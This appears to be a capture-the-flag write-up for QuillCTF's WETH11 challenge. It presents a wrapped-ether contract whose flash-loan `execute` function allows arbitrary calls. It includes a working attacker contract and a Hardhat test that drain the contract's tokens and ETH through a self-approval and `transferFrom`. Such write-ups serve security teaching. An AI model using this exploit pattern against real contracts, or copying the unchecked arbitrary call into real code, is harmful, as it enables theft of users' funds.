# QuillCTF: 11. WETH11

> We have fixed WETH10 and now have introduced its new version WETH11.
> But along the way, bob made a mistake and transferred its tokens to the wrong address.
> Can you help bob recover his 10 ether?

**Objective of CTF:**

- Contract should have 0 balance, both in ETH and WETH.
- Bob should have 10 ETH.

**Target contract:**

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Angel Di Maria Wrapped Ether
contract WETH11 is ERC20("Angel Di Maria Wrapped Ether", "WETH11"), ReentrancyGuard {
  receive() external payable {
    deposit();
  }

  function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
  }

  function deposit() public payable nonReentrant {
    _mint(msg.sender, msg.value);
  }

  function withdraw(uint256 wad) external nonReentrant {
    _burn(msg.sender, wad);
    Address.sendValue(payable(msg.sender), wad);
  }

  function withdrawAll() external nonReentrant {
    uint256 balance = balanceOf(msg.sender);
    _burnAll();
    Address.sendValue(payable(msg.sender), balance);
  }

  /// @notice Request a flash loan in ETH
  function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
    uint256 prevBalance = address(this).balance;
    Address.functionCallWithValue(receiver, data, amount);

    require(address(this).balance >= prevBalance, "flash loan not returned");
  }
}
```

## The Attack

The main exploit here is the arbitrary function-execution bug, present in the `execute` function that provides flash loan. Independent of the amount of flash loan, we can execute anything we would like from the persepctive of the WETH contract thanks to `functionCallWithValue` that is being done inside it.

With that said, our attack is to simply transfer ourselves us all the tokens the contract has. We will send the following calldata to the `execute` function:

```ts
abi.encodeWithSignature("transfer(address,uint256)", [uint256(uint160(bob)), weth11.balanceOf(target)]
```

This will cause the contract to transfer everything it has to Bob. Note that a cooler attack would be to approve a huge number of tokens to Bob, and then use `transferFrom` to get the tokens. This way, Bob can get tokens transferred to WETH at a later time too.

Afterwards, Bob will call `withdrawAll` to convert his WETH to ETH.

## Proof of Concept

Our attacker contract, acting as Bob here, is written as follows:

```solidity
contract WETH11Attacker {
  WETH11 private weth11;
  address immutable target;
  address immutable bob;

  constructor(address targetAddress) payable {
    weth11 = WETH11(payable(targetAddress));
    bob = address(this);
    target = targetAddress;

    // deposit 10 ETH
    weth11.deposit{value: 10 ether}();

    // mistakenly, send the 10 WETH you've just gained
    weth11.transfer(targetAddress, 10 ether);
  }

  function pwn() external {
    // take 0-amount flash loan, approving the entire balance of WETH to Bob
    uint256 balance = weth11.balanceOf(target);
    weth11.execute(target, 0, abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(bob)), balance]));

    // transfer tokens
    weth11.transferFrom(target, bob, balance);

    // withdraw
    weth11.withdrawAll();
  }

  receive() external payable {}
}
```

A Hardhat proof-of-concept test is written as follows (in compliance with the setup described in Foundry):

```ts
describe('QuillCTF: 11. WETH11', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: WETH11;
  let bob: WETH11Attacker;

  const BOB_INITIAL_BALANCE = ethers.utils.parseEther('10');

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('WETH11', owner).then(f => f.deploy());
    await contract.deployed();

    // bob is deployed with 10 ether, deposits it to WETH and transfer the WETH mistakenly
    bob = await ethers
      .getContractFactory('WETH11Attacker', owner)
      .then(f => f.deploy(contract.address, {value: BOB_INITIAL_BALANCE}));

    // as a result, contract has 10 ETH and 10 WETH
    expect(await ethers.provider.getBalance(contract.address)).to.eq(BOB_INITIAL_BALANCE);
    expect(await contract.balanceOf(contract.address)).to.eq(BOB_INITIAL_BALANCE);
  });

  it('should rescue funds', async () => {
    await bob.connect(attacker).pwn();
  });

  after(async () => {
    // empty weth contract
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);
    expect(await contract.balanceOf(contract.address)).to.eq(0);

    // bob balance should be 10 ETH
    expect(await ethers.provider.getBalance(bob.address)).to.eq(BOB_INITIAL_BALANCE);
  });
});
```
